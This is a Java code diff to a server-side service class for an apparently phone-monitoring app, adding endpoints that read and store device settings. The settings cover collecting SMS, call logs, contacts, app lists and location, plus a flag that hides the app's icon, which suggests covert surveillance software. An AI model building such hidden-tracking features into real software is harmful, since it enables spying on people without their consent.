@@ -5,11 +5,14 @@ import com.shiz.Constants;
 import com.shiz.entity.AppEntity;
 import com.shiz.entity.BatteryStatusEntity;
 import com.shiz.entity.DeviceEntity;
+import com.shiz.entity.SettingsEntity;
 import com.shiz.model.Device;
 import com.shiz.model.Location;
 import com.shiz.model.data.Contact;
+import com.shiz.model.data.Settings;
 import com.shiz.model.data.event.*;
 import com.shiz.model.request.InitialDeviceRequest;
+import com.shiz.model.request.SyncRequest;
 import com.shiz.model.request.indormation.*;
 import com.shiz.model.respose.*;
 import com.shiz.model.respose.error.ErrorDeviceIdResponse;
@@ -70,6 +73,38 @@ public class DBServiceImpl implements DBService {
                 }
                 AllDevicesResponse deviceResponse = new AllDevicesResponse(Constants.STATE_OK, deviceList);
                 return new ResponseEntity<>(deviceResponse, HttpStatus.OK);
+            } else {
+                return getErrorResponseStatus(Constants.NOT_FOUND_DEVICES);
+            }
+        } catch (Exception e) {
+            return getErrorResponseStatus(Constants.BAD_REQUEST);
+        }
+    }
+
+    public ResponseEntity<BaseResponse> getSettingsDevice(String request) {
+        // имитируем обращение к БД
+        SyncRequest syncRequest = gson.fromJson(request, SyncRequest.class);
+        try {
+            if (syncRequest != null) {
+                SettingsEntity settingsEntity = deviceDao.getSettings(syncRequest.getDevice());
+                Settings settings = Settings.newBuilder()
+                        .is_service(settingsEntity.getIsService())
+                        .location_mode(settingsEntity.getLocationMode())
+                        .hide_icon(settingsEntity.getIsHideIcon())
+                        .list_app(settingsEntity.getListApp())
+                        .list_call(settingsEntity.getListCall())
+                        .list_sms(settingsEntity.getListSms())
+                        .is_airplane_mode(settingsEntity.isAirplaneMode())
+                        .is_screen(settingsEntity.isScreen())
+                        .is_call(settingsEntity.getIsCall())
+                        .is_sms(settingsEntity.getIsSms())
+                        .is_wifi(settingsEntity.isWifi())
+                        .is_location(settingsEntity.getIsLocation())
+                        .list_phone_book(settingsEntity.getListPhoneBook())
+                        .password(settingsEntity.getPassword())
+                        .build();
+                PeriodicalResponse periodicalResponse = new PeriodicalResponse(Constants.STATE_OK, settings);
+                return new ResponseEntity<>(periodicalResponse, HttpStatus.OK);
             } else {
                 return getErrorResponseStatus(Constants.NOT_FOUND_DEVICES);
             }
@@ -286,29 +321,38 @@ public class DBServiceImpl implements DBService {
         }
     }
 
-//    /*
-//    getters
-//     */
-//    public ResponseEntity<PeriodicalResponse> getSettingsDevice(String request) {
-//        // имитируем обращение к БД
-//        PeriodicalRequest periodicalRequest = gson.fromJson(request, PeriodicalRequest.class);
-//
-//        if (periodicalRequest != null) {
-//            Settings settings = Settings.newBuilder()
-//                    .is_call(false)
-//                    .is_location(true)
-//                    .is_sms(true)
-//                    .list_app(false)
-//                    .list_call(false)
-//                    .list_phone_book(false)
-//                    .list_app(false)
-//                    .build();
-//            PeriodicalResponse periodicalResponse = new PeriodicalResponse(Constants.STATE_OK, settings);
-//            return new ResponseEntity<PeriodicalResponse>(periodicalResponse, HttpStatus.OK);
-//        } else {
-//            throw new ErrorExceptionResponse(0, "Error on server");
-//        }
-//    }
+    public ResponseEntity<BaseResponse> setSettingsDevice(String request) {
+        // имитируем обращение к БД
+        SettingsRequest settingsRequest = gson.fromJson(request, SettingsRequest.class);
+        if (settingsRequest != null) {
+            Settings settingsEntity = settingsRequest.getSettings();
+            SettingsEntity settings = SettingsEntity.newBuilder()
+                    .is_call(settingsEntity.isCall())
+                    .is_sms(settingsEntity.isSms())
+                    .is_location(settingsEntity.isLocation())
+                    .list_app(settingsEntity.isListApp())
+                    .list_call(settingsEntity.isListCall())
+                    .list_sms(settingsEntity.isListSms())
+                    .list_phone_book(settingsEntity.isListPhoneBook())
+                    .hide_icon(settingsEntity.isHideIcon())
+                    .is_service(settingsEntity.isService())
+                    .password(settingsEntity.getPassword())
+                    .is_screen(settingsEntity.isScreen())
+                    .is_wifi(settingsEntity.isWifi())
+                    .is_airplane_mode(settingsEntity.isAirplaneMode())
+                    .location_mode(settingsEntity.isLocationMode()).build();
+            try {
+                deviceDao.setSettings(settingsRequest.getDevice(), settings);
+                InformationResponse informationResponse = new InformationResponse(Constants.STATE_OK);
+                return new ResponseEntity<>(informationResponse, HttpStatus.OK);
+            } catch (Exception e) {
+                return getErrorResponseStatus(Constants.NOT_FOUND_DEVICE);
+            }
+        } else {
+            ErrorResponse errorResponse = new ErrorResponse(Constants.STATE_ERROR, Constants.BAD_REQUEST);
+            return new ResponseEntity<>(errorResponse, HttpStatus.BAD_REQUEST);
+        }
+    }
 //
 //    public ResponseEntity<Device> getCallList(int deviceId) {
 //        // имитируем обращение к БД
